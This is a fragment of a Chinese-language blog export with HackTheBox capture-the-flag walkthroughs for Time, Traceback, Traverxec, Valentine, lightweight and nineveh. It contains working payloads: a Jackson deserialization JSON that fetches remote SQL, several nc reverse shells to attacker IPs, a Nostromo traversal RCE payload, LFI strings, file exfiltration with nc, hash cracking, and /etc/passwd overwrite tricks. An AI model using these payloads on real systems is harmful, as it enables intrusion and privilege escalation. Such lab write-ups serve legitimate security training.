      </tags>
  </entry>
  <entry>
    <title>HTB:Time</title>
    <url>/2020/10/27/HTB-Time/</url>
    <content><![CDATA[<h1 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Time/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Time/2.png" alt="2"></p>
<p>页面随便输入一些信息，得到报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN</span><br></pre></td></tr></table></figure>

<p>得到目标运行这jackson</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>google搜索，可以找到CVE-2019-12384</p>
<p>exploit:<a href="https://github.com/jas502n/CVE-2019-12384">https://github.com/jas502n/CVE-2019-12384</a><br>原理:<a href="http://blog.nsfocus.net/cve-2019-12384-2/">http://blog.nsfocus.net/cve-2019-12384-2/</a></p>
<p>看来只需要构造一个恶意的json包，就可以得到RCE，顺着文档来</p>
<p>现在本地开启http服务</p>
<p><img src="/images/Time/3.png" alt="3"></p>
<p>修改<code>inject.sql</code>的poc，比如ping</p>
<p><img src="/images/Time/4.png" alt="4"></p>
<p>原文payload是这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;localhost:8000&#x2F;inject.sql&#39;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>

<p>我们的输入点直接在Web页面上，所以除了修改刚刚开放的http地址和端口外，还要注意json的格式，删除前后引号，删掉转义，最后的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;10.10.16.98:8000&#x2F;inject.sql&#39;&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/images/Time/5.png" alt="5"></p>
<p>成功获得RCE，现在反弹shell即可</p>
<p><img src="/images/Time/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>非常简单</p>
<p>发现可以写文件，文件名疑似计划任务</p>
<p><img src="/images/Time/7.png" alt="7"></p>
<p>确认计划任务及权限</p>
<p><img src="/images/Time/8.png" alt="8"></p>
<p>直接写入反弹shell</p>
<p><img src="/images/Time/9.png" alt="9"></p>
<p>获得root</p>
<p><img src="/images/Time/10.png" alt="10"></p>
<p>不过shell秒断，换个方法也是一回事</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;chmod 4777 &#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;timer_backup.sh</span><br><span class="line">&#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Traceback</title>
    <url>/2020/10/25/HTB-Traceback/</url>
    <content><![CDATA[<h1 id="Traceback"><a href="#Traceback" class="headerlink" title="Traceback"></a>Traceback</h1><p>有些CTF，这台机器的场景是目标已经被其他黑客拿下，我们是第二波攻击者</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/TraceBack/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口提示已经有webshell在这个站点</p>
<p><img src="/images/TraceBack/2.png" alt="2"></p>
<p>用<code>/usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt</code>进行枚举，它包含了一些常见php WebShell的名称</p>
<p><img src="/images/TraceBack/3.png" alt="3"></p>
<p>发现了webshell</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>需要凭据进行登录</p>
<p><img src="/images/TraceBack/4.png" alt="4"></p>
<p>可以在github找到这个WebShell的源码:<a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></p>
<p>发现默认凭据</p>
<p><img src="/images/TraceBack/5.png" alt="5"></p>
<p>登录进去后，是个php大马，可以执行系统命令</p>
<p><img src="/images/TraceBack/6.png" alt="6"></p>
<p>直接反弹到本地</p>
<p><img src="/images/TraceBack/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>想去查看user.txt发现没有，看来user的flag不是我们的，但是发现note.txt</p>
<p><img src="/images/TraceBack/8.png" alt="8"></p>
<p>意思是说有一个工具来练习lua脚本，需要找到它</p>
<p>继续检查sudo权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(sysadmin) NOPASSWD: &#x2F;home&#x2F;sysadmin&#x2F;luvit</span><br></pre></td></tr></table></figure>

<p>尝试执行，发现需要sudo到sysadmin才可以，而且不知道是干嘛的</p>
<p><img src="/images/TraceBack/9.png" alt="9"></p>
<p>继续收集信息，发现了<code>.bash_history</code>有提示</p>
<p><img src="/images/TraceBack/10.png" alt="10"></p>
<p>看来这个<code>luvit</code>程序可以传递一个lua脚本作为参数</p>
<p>寻找lua获得shell的语法</p>
<p><img src="/images/TraceBack/11.png" alt="11"></p>
<p>跟着提示来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; evil.lua</span><br><span class="line">sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit evil.lua</span><br></pre></td></tr></table></figure>

<p><img src="/images/TraceBack/12.png" alt="12"></p>
<p>真获得shell了</p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>linpeas发现拥有对<code>/etc/update-motd.d</code>的写入权限</p>
<p><img src="/images/TraceBack/13.png" alt="13"></p>
<p>这个是ssh登录后会触发的动作，所以我们先生成一些密钥对，完成SSH登录</p>
<p><img src="/images/TraceBack/15.png" alt="15"></p>
<p>发现输出了<code>Welcome to Xh4H land</code></p>
<p>回到<code>update-motd.d</code>目录查看文件，发现<code>00-header</code>这个文件有同样的行为</p>
<p><img src="/images/TraceBack/16.png" alt="16"></p>
<p>所以理论上我们拥有W权限，写入一个反弹shell，再进行ssh登录，由于ssh是root运行，它就会来执行这个反弹shell，从而得到提权</p>
<p>不过执行的时候有点坑！如果使用pspy64，会发现一个计划任务</p>
<p><img src="/images/TraceBack/14.png" alt="14"></p>
<p>有个备份文件每30秒会进行恢复，而且我们没有对备份文件的写入权限，所以上述操作需要在30秒内完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.4 443 &gt;&#x2F;tmp&#x2F;f&#39; &gt;&gt; 00-header</span><br><span class="line">ssh -i id_rsa sysadmin@10.10.10.181</span><br></pre></td></tr></table></figure>

<p><img src="/images/TraceBack/17.png" alt="17"></p>
<p>ssh被悬挂，我们获得了root</p>
<p><img src="/images/TraceBack/18.png" alt="18"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Traverxec</title>
    <url>/2020/10/28/HTB-Traverxec/</url>
    <content><![CDATA[<h1 id="Traverxec"><a href="#Traverxec" class="headerlink" title="Traverxec"></a>Traverxec</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Traverxec/1.png" alt="1"></p>
<p>直接发现了不通的地方，中间件是<code>Nostromo</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞，发现了RCE</p>
<p><img src="/images/Traverxec/2.png" alt="2"></p>
<p>msf存在利用，而且python脚本也可以，这里主要学习一些抓包的技巧</p>
<p>首先确认RCE的存在，非常简单，而且是拥有回显的</p>
<p><img src="/images/Traverxec/3.png" alt="3"></p>
<p>抓python脚本包，通过设置burp端口转发和透明代理</p>
<p><img src="/images/Traverxec/4.png" alt="4"></p>
<p>对着代理打就可以</p>
<p><img src="/images/Traverxec/5.png" alt="5"></p>
<p>这里成功抓到包了，但这个EXP似乎有点奇怪，查看python脚本，得到payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;POST &#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;bin&#x2F;sh HTTP&#x2F;1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#39;.format(cmd)</span><br></pre></td></tr></table></figure>

<p>再去wireshark看看</p>
<p><img src="/images/Traverxec/6.png" alt="6"></p>
<p>不知道什么原因，好像<code>\r\n</code>这里会出现一些问题，修改一下payload，我们仍然可以得到RCE</p>
<p><img src="/images/Traverxec/7.png" alt="7"></p>
<p>ping和反弹shell都可以，但是回显的这里就不行了</p>
<p><img src="/images/Traverxec/8.png" alt="8"></p>
<p>有点迷</p>
<p>msf抓到也一样，不过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set proxies HTTP:127.0.0.1:8080</span><br><span class="line">set reverseallowproxy true</span><br><span class="line">set forceexploit true			&#x2F;&#x2F;关闭指纹识别，强制发送payload</span><br></pre></td></tr></table></figure>

<p>也有相同的问题</p>
<p><img src="/images/Traverxec/9.png" alt="9"></p>
<p>感觉是CRLF的问题，以后再研究，反正就是一键获取shell，顺便来个openssl加密</p>
<p><img src="/images/Traverxec/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas发现了普通用户david和一个密码</p>
<p><img src="/images/Traverxec/11.png" alt="11"></p>
<p>尝试破解，可以破解出来，但是无法切换</p>
<p><img src="/images/Traverxec/12.png" alt="12"></p>
<p>继续查看文件，在web目录的conf目录里发现了配置文件</p>
<p><img src="/images/Traverxec/13.png" alt="13"></p>
<p>提示了david的home目录里存在public_www目录，这点linpeas无法发现</p>
<p>我们不拥有david的主目录的R权限，无法枚举文件，但是却拥有主目录的<code>public_www</code>的R权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -ld &#x2F;home&#x2F;david&#x2F;public_www</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25  2019 &#x2F;home&#x2F;david&#x2F;public_www</span><br><span class="line"></span><br><span class="line">ls -ld &#x2F;home&#x2F;david&#x2F;</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25  2019 &#x2F;home&#x2F;david&#x2F;</span><br><span class="line"></span><br><span class="line">ls -la &#x2F;home&#x2F;david</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;david&#39;: Permission denied</span><br></pre></td></tr></table></figure>

<p>接着发现了一个压缩包，好像是ssh私钥的备份</p>
<p><img src="/images/Traverxec/14.png" alt="14"></p>
<p>传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 443 &gt; ssh.tgz -q 1</span><br><span class="line"></span><br><span class="line">nc -nv 10.10.16.98 443 &lt; &#x2F;home&#x2F;david&#x2F;public_www&#x2F;protected-file-area&#x2F;backup-ssh-identity-files.tgz -q 1</span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xvf ssh.tgz</span><br></pre></td></tr></table></figure>

<p>里面存在<code>id_rsa</code></p>
<p><img src="/images/Traverxec/15.png" alt="15"></p>
<p>但是私钥被加密了，而且密码不是之前破解的，可以使用john进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py .&#x2F;id_rsa &gt; hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Traverxec/16.png" alt="16"></p>
<p>获取shell</p>
<p><img src="/images/Traverxec/17.png" alt="17"></p>
<p>在home目录发现了一个shell脚本</p>
<p><img src="/images/Traverxec/18.png" alt="18"></p>
<p>不用分析文件行为，知道能sudo能够运行<code>journalctl</code>就行，在<code>gtfobins</code>上得到提权方法</p>
<p><img src="/images/Traverxec/19.png" alt="19"></p>
<p>在本机上测试了一下，当我们输入<code>journalctl</code>后，仍然在终端中</p>
<p><img src="/images/Traverxec/20.png" alt="20"></p>
<p>但是在对方机器上运行，还是需要密码</p>
<p><img src="/images/Traverxec/21.png" alt="21"></p>
<p>但是<code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code>是可以执行的，所以sudoers里面应该就是这条语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure>

<p>这条命令输入后，仍然会在终端中，可以完成提权</p>
<p><img src="/images/Traverxec/22.png" alt="22"></p>
<p>这里有个坑，你要把终端给拉小一点，比如</p>
<p><img src="/images/Traverxec/23.png" alt="23"></p>
<p>要不然你得不到终端会话</p>
<p><img src="/images/Traverxec/25.png" alt="25"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Valentine</title>
    <url>/2020/06/24/HTB-Valentine/</url>
    <content><![CDATA[<h1 id="Valentine"><a href="#Valentine" class="headerlink" title="Valentine"></a>Valentine</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Valentine/1.jpg" alt="1"></p>
<p>就三个服务ssh、http、https </p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>在80端口发现图片</p>
<p><img src="/images/Valentine/2.jpg" alt="2"></p>
<p>这是一个提示，该漏洞图片为heartbleed漏洞(CVE-2014-0160)</p>
<p>进行目录探测</p>
<p><img src="/images/Valentine/6.jpg" alt="6"></p>
<p>发现dev目录</p>
<p><img src="/images/Valentine/7.jpg" alt="7"></p>
<p>内容经过hex编码，将其解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -r -ps hex.txt &gt; id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/8.jpg" alt="8"></p>
<p>是一个公钥</p>
<p>而且注意该密钥的文件名为hype.txt，我们可以认为其中一个账户为hype，大多数key格式为<code>USERNAME_key</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用nmap进行vuln扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 443 --script vuln 10.10.10.79</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/3.jpg" alt="3"></p>
<p>确认存在漏洞</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Valentine/4.jpg" alt="4"></p>
<p>使用32745.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 32745.py 10.10.10.79</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/5.jpg" alt="5"></p>
<p>似乎发现了一段登录凭证，且被base64编码了，进行解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg&#x3D;&#x3D; | base64 -d</span><br><span class="line">heartbleedbelievethehype</span><br></pre></td></tr></table></figure>

<p>得到了一个字符串</p>
<p>接下来就可以尝试登录ssh，输入私钥即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa hype@10.10.10.79</span><br><span class="line">heartbleedbelievethehype</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/9.jpg" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p><img src="/images/Valentine/10.jpg" alt="10"></p>
<p>进程里发现root正在运行tmux，-S连接到了一个Socket文件，拥有该socket文件的W权限</p>
<p><img src="/images/Valentine/12.jpg" alt="12"></p>
<p>可以直接指定这个socket文件，连接这个会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux -S &#x2F;.devs&#x2F;dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="/images/Valentine/11.jpg" alt="11"></p>
<p>这个会话执行者是root，所以直接获取root的shell</p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>40839.c</p>
<p><img src="/images/Valentine/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:lightweight</title>
    <url>/2020/06/30/HTB-lightweight/</url>
    <content><![CDATA[<h1 id="lightweight"><a href="#lightweight" class="headerlink" title="lightweight"></a>lightweight</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/lightweight/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先对ldap进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search 10.10.10.119</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.10.10.119 -s base namingcontexts</span><br><span class="line">ldapsearch -x -h 10.10.10.119 -b &quot;dc&#x3D;lightweight,dc&#x3D;htb&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/2.jpg" alt="2"></p>
<p><img src="/images/lightweight/3.jpg" alt="3"></p>
<p>确实枚举出了一些信息，如密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv</span><br><span class="line">e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;crypt&#125;$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE&#x2F;g&#x2F;Z&#x2F;7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA.&#x2F;44&#x2F;</span><br><span class="line">&#123;crypt&#125;$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX&#x2F;QEfjdRQzgn1</span><br></pre></td></tr></table></figure>

<p>放到<code>hash-identifier</code>中发现为SHA-256，使用hashcat进行破解，没有解出来</p>
<p>尝试在web中发掘信息<br>这次无法运行目录扫描，会被ban ip</p>
<p>在info和user页面获得了一些提示</p>
<p><img src="/images/lightweight/4.jpg" alt="4"></p>
<p><img src="/images/lightweight/5.jpg" alt="5"></p>
<p>告诉我们可以用我们的ip进行ssh登录</p>
<p><img src="/images/lightweight/6.jpg" alt="6"></p>
<p>成功登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/lightweight/7.jpg" alt="7"></p>
<p>我们发现tcpdump添加两个Capabilities，具体功能参考<a href="https://blog.csdn.net/alex_yangchuansheng/article/details/102796001">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CAP_NET_ADMIN:允许执行网络管理任务</span><br><span class="line">CAP_NET_RAW:允许使用原始套接字</span><br></pre></td></tr></table></figure>

<p>所以接下来，在对方机器使用tcpdump监听389端口，需要指定网口为环回口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo port 389 -w capture.cap -v</span><br></pre></td></tr></table></figure>

<p>之后访问ldap创建账号的页面<code>http://10.10.10.119/info.php</code>这样会调用ldap</p>
<p><img src="/images/lightweight/8.jpg" alt="8"></p>
<p>访问的同时，显示抓到了包，之后把包给传过来</p>
<p><img src="/images/lightweight/9.jpg" alt="9"></p>
<p>成功获取密码</p>
<p><img src="/images/lightweight/10.jpg" alt="10"></p>
<p>成功切换用户</p>
<p><img src="/images/lightweight/11.jpg" alt="11"></p>
<p>在目录发现了backup文件，传过来看看</p>
<p>压缩包存在密码，进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libcompress-raw-lzma-perl</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;7z2john.pl backup.7z</span><br><span class="line">john --format&#x3D;7z hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/12.jpg" alt="12"></p>
<p>破解出密码<code>delete</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x backup.7z</span><br><span class="line">delete</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/13.jpg" alt="13"></p>
<p>接着在解压后的<code>stats.php</code>发现了用户<code>ldapuser1</code>的密码，切换ldapuser1</p>
<p><img src="/images/lightweight/14.jpg" alt="14"></p>
<p>发现openssl的capabilites设置为ep<br>这代表该程序只可以做任何事情</p>
<p><img src="/images/lightweight/15.jpg" alt="15"></p>
<p>不过需要注意，这里的openssl不在环境变量，环境变量的openssl不具有ep，所以需要指定路径进行调用</p>
<p>之后我们可以利用openssl的高权限读写完成提权</p>
<p><img src="/images/lightweight/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;openssl enc -in &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">vi passwd </span><br><span class="line">cat passwd | .&#x2F;openssl enc -out &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>什么方法都可以，passwd改已有密码用户id，添加新用户，sudoers改权限，shadow改root密码</p>
<p>最重要的是，openssl读取高权限文件后生成的文件，我们具有rw权限</p>
<p><img src="/images/lightweight/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:nineveh</title>
    <url>/2020/06/16/HTB-nineveh/</url>
    <content><![CDATA[<h1 id="nineveh"><a href="#nineveh" class="headerlink" title="nineveh"></a>nineveh</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/nineveh/1.jpg" alt="1"></p>
<p>开放了两个web服务，http和https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>http和https首页都没有额外发现，也没有额外链接，所以先进行目录枚举</p>
<p><img src="/images/nineveh/2.jpg" alt="2"></p>
<p>在80端口，发现了文件夹<code>department</code></p>
<p><img src="/images/nineveh/3.jpg" alt="3"></p>
<p>发现是一个登录页面，这个登录页面有利于我们暴力破解<br>如果输入账户例如admin，页面提示Invalid Password!说明用户存在<br>如果输入用户abcdef，页面提示invalid username说明用户不存在</p>
<p>所以我们可以针对以获取的用户名admin进行暴力破解</p>
<p><img src="/images/nineveh/4.jpg" alt="4"></p>
<p>之后就可以获取用户名/密码 <code>admin/1q2w3e4r5t</code></p>
<p><img src="/images/nineveh/5.jpg" alt="5"></p>
<p>以admin登录进入，发现似乎也没有有价值的信息，不过url<code>manage.php?notes=files/ninevehNotes.txt</code>后面的txt很像文件包含<br>经测试，确实存在文件包含payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;files&#x2F;ninevehNotes..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>仔细研究后发现，这个文件包含漏洞，必须包含ninevehNotes关键字，才可以生效，如下payload也是可以的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notes&#x3D;?ninevehNotes..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/6.jpg" alt="6"></p>
<p>可以发现用户amrois是可以登录bash的<br>至此很难再有其他发现了</p>
<p>之后我选择扫描443端口的目录</p>
<p><img src="/images/nineveh/7.jpg" alt="7"></p>
<p>扫描出了目录db，尝试访问</p>
<p><img src="/images/nineveh/8.jpg" alt="8"></p>
<p>只好再次尝试暴力破解<br>得出密码password123</p>
<p><img src="/images/nineveh/9.jpg" alt="9"></p>
<p>登录之后是web应用phpLiteAdminv1.9</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="phpLiteAdmin"><a href="#phpLiteAdmin" class="headerlink" title="phpLiteAdmin"></a>phpLiteAdmin</h3><p>搜索公开漏洞</p>
<p><img src="/images/nineveh/10.jpg" alt="10"></p>
<p>攻击者创建php扩展名的数据库，再插入php恶意代码到数据表字段内，之后访问数据库文件即可触发恶意代码<br>我们已经拥有可以触发本地访问的LFI漏洞 ，所以我们创建的数据库得存在字符串<code>ninevehNotes</code>才行</p>
<p>我们创建数据库ninevehNotes.php<br>页面已经提供了文件的位置<br>再创建表，表名和序号随便写</p>
<p><img src="/images/nineveh/11.jpg" alt="11"></p>
<p>payload选用如下，尝试过msfvenom生成的payload，不过会因为单引号的问题报错，所以我的这个payload没有问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.173 4444 &gt;&#x2F;tmp&#x2F;f&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/12.jpg" alt="12"></p>
<p>payload插在<code>Filed</code>或者<code>Default Value</code>都可以，Type选Text</p>
<p>之后再使用文件包含触发php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;&#x2F;var&#x2F;tmp&#x2F;ninevehNotes.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/13.jpg" alt="13"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cronjob"><a href="#cronjob" class="headerlink" title="cronjob"></a>cronjob</h3><p>尝试使用linpeas进行提权，不过一无所获</p>
<p>不过在<code>/report</code>目录下我有所发现</p>
<p><img src="/images/nineveh/14.jpg" alt="14"></p>
<p>这看起来是一个cronjob，我想找出这个进程是什么</p>
<p>使用pspy进行寻找</p>
<p><img src="/images/nineveh/15.jpg" alt="15"></p>
<p>似乎发现了这个进程，名叫chkrootkit</p>
<p>寻找公开漏洞</p>
<p><img src="/images/nineveh/16.jpg" alt="16"></p>
<p>发现了权限提升</p>
<p><img src="/images/nineveh/17.jpg" alt="17"></p>
<p>利用方法是在tmp目录下创建可执行文件，名为update<br>之后等待chrootkit去执行就行</p>
<p>update的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.173 5555 &gt;&#x2F;tmp&#x2F;ff</span><br></pre></td></tr></table></figure>

